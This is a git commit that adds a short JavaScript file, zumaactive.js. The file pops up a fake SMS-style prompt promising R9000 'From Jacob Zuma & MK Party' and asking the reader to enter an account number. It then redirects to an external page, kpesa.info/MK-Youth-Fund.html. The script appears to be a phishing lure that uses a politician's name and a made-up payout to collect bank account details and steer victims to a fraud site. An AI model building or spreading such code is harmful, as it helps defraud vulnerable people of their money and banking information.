ec1d83ea523617271dea4d664e81e0801fe34097
kpesaa <meiosis_logins.2d@icloud.com>
2026-05-22 12:09:08 +0100

    Create zumaactive.js

---
+++ zumaactive.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW R9000'
+password=prompt('SMS: Congratulations, you are eligible to receive R9000 From Jacob Zuma & MK Party, click OK to Enter Your Acc. Number','WITHDRAW R9000');
+if (password != 'WITHDRAW R9000') {
+location.href='https://kpesa.info/MK-Youth-Fund.html';
+}
